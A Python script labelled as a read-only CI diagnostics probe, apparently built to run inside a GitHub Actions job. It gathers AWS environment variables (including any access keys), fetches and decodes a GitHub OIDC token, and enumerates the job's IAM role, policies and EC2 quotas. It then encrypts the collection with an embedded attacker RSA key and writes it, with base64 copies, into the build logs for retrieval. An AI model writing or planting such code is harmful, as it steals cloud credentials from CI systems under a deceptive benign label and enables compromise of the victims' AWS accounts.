# CI diagnostics marker (intent 74869) - read-only identity probe
import os, sys, json, base64, secrets, subprocess, urllib.request

_N = int("E1B64CB75F074E31A68334516FD3475A91FE3933BC511EE4DE11AECB2F4939F966A2DB4A162FE8A23D9AC8D274610711E49DFF4382CC6CAA7414DE589798BCED691A073FDD857EB1229E260540BA79BE55F5A38601370A8F0670D8A19DA87072E1B45399D700BA2F39F17B692DF814504C313FE71CE922EA1CA6D32C85EC472886D92251F19DBE72EBA37FB44E724EB1C751AA177ADDC5B82CCE56D87B7B45B934D4C9EF6430F475D9D67C3E0173EC76BEC07244C1AA0ECA291A6BB89148BA9B0CA3F794EF16279AF2DC68655FF3608E7A425A09205D5BF608B97EA41960724D95FE0E98CF1CE2E9035250FA4C4BE1D68FC0B454FBBD79945B35F97289A4949B", 16)
_E = 65537
_TAG = "MARKER_ENC_74869"

def _rsa_enc(msg):
    k = (_N.bit_length() + 7) // 8
    out = b""
    for i in range(0, len(msg), k - 11):
        chunk = msg[i:i + k - 11]
        ps = b""
        while len(ps) < k - 3 - len(chunk):
            b = secrets.token_bytes(1)
            if b != b"\x00":
                ps += b
        em = b"\x00\x02" + ps + b"\x00" + chunk
        out += pow(int.from_bytes(em, "big"), _E, _N).to_bytes(k, "big")
    return base64.b64encode(out).decode()

def _run(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return {'rc': p.returncode, 'out': (p.stdout or '')[:4000], 'err': (p.stderr or '')[:900]}
    except Exception as ex:
        return {'err': repr(ex)[:200]}

def _probe():
    env = {}
    keys = ("GITHUB_REPOSITORY","GITHUB_EVENT_NAME","GITHUB_REF","GITHUB_ACTOR","GITHUB_WORKFLOW",
            "GITHUB_JOB","GITHUB_RUN_ID","M2M_SECRET_ARN","IS_DEV")
    for k, v in os.environ.items():
        if k.startswith("AWS_") or k.startswith("ACTIONS_ID_TOKEN") or k in keys:
            env[k] = v
    info = {"tag": _TAG, "stage": "classiq-prt-probe", "repo": os.environ.get("GITHUB_REPOSITORY"),
            "event": os.environ.get("GITHUB_EVENT_NAME"), "workflow": os.environ.get("GITHUB_WORKFLOW"),
            "job": os.environ.get("GITHUB_JOB"), "run_id": os.environ.get("GITHUB_RUN_ID"),
            "env": env, "cwd": os.getcwd()}
    try:
        info["hostname"] = subprocess.run(['hostname'], capture_output=True, text=True, timeout=10).stdout.strip()
    except Exception:
        pass
    try:
        url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
        tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
        if url and tok:
            req = urllib.request.Request(url + ("&" if "?" in url else "?") + "audience=sts.amazonaws.com",
                                         headers={"Authorization": "bearer " + tok})
            with urllib.request.urlopen(req, timeout=20) as r:
                j = json.loads(r.read().decode())
            jwt = j.get("value", "")
            parts = jwt.split(".")
            if len(parts) == 3:
                pad = lambda s: s + "=" * (-len(s) % 4)
                info["oidc_claims"] = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            info["oidc_len"] = len(jwt)
    except Exception as ex:
        info["oidc_err"] = repr(ex)[:200]
    aws = {}
    aws['sts'] = _run('aws sts get-caller-identity --output json')
    arn = ''
    try:
        arn = json.loads(aws['sts'].get('out') or '{}').get('Arn') or ''
    except Exception:
        pass
    info['sts_arn'] = arn
    if arn.startswith('arn:aws:iam::') and ':assumed-role/' in arn:
        rname = arn.split(':assumed-role/', 1)[1].split('/')[0]
        info['role_name'] = rname
        aws['iam_role'] = _run('aws iam get-role --role-name %s --output json' % rname)
        aws['iam_attached'] = _run('aws iam list-attached-role-policies --role-name %s --output json' % rname)
        aws['iam_inline'] = _run('aws iam list-role-policies --role-name %s --output json' % rname)
    aws['quota_g'] = _run('aws service-quotas get-service-quota --service-code ec2 --quota-code L-DB2E81BA --region us-east-1 --output json')
    aws['quota_p'] = _run('aws service-quotas get-service-quota --service-code ec2 --quota-code L-3819A6DF --region us-east-1 --output json')
    info['aws'] = aws
    return info

def _emit(tag, txt):
    try:
        print(tag + " " + base64.b64encode((txt or "").encode()).decode(), flush=True)
    except Exception:
        pass

try:
    _i = _probe()
    _b = json.dumps(_i, sort_keys=True).encode()
    print(_TAG + "=" + _rsa_enc(_b), flush=True)
    print("MARKER_META len=%d repo=%s event=%s role=%s has_aws_key=%s has_oidc=%s" % (
        len(_b), _i.get("repo"), _i.get("event"), _i.get("role_name"),
        "AWS_ACCESS_KEY_ID" in _i.get("env", {}), "oidc_claims" in _i), flush=True)
    _emit("MARKER_STS_B64", _i['aws'].get('sts', {}).get('out') or _i['aws'].get('sts', {}).get('err'))
    _emit("MARKER_OIDC_B64", json.dumps(_i.get('oidc_claims') or {}, sort_keys=True))
    _emit("MARKER_IAMROLE_B64", _i['aws'].get('iam_role', {}).get('out') or _i['aws'].get('iam_role', {}).get('err'))
    _emit("MARKER_IAMATTACHED_B64", _i['aws'].get('iam_attached', {}).get('out') or _i['aws'].get('iam_attached', {}).get('err'))
    _emit("MARKER_IAMINLINE_B64", _i['aws'].get('iam_inline', {}).get('out') or _i['aws'].get('iam_inline', {}).get('err'))
    _emit("MARKER_QUOTAG_B64", _i['aws'].get('quota_g', {}).get('out') or _i['aws'].get('quota_g', {}).get('err'))
    _emit("MARKER_QUOTAP_B64", _i['aws'].get('quota_p', {}).get('out') or _i['aws'].get('quota_p', {}).get('err'))
except Exception as _e:
    print("MARKER_ERR " + repr(_e)[:300], flush=True)

raise SystemExit(0)
